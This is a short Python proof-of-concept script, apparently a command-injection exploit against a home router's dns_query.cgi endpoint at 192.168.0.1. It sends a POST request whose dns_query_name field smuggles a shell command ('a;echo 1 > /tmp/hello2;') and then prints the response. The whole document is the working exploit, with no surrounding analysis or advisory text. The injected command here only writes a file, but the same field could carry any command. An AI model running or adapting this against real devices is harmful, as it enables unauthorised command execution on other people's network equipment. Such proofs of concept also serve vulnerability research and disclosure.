#!/usr/bin/env python3

import requests

ip = "http://192.168.0.1/"

url = ip + 'dns_query.cgi'

command = "a;echo 1 > /tmp/hello2;"
payload = {
    "html_response_page": "back.asp",
    "dns_query_name": command,
    "html_response_return_page": "st_routing.asp",
    "countdonw_time": '12',
}

r = requests.post(url, data=payload)
print(r.headers)
print(r.text)
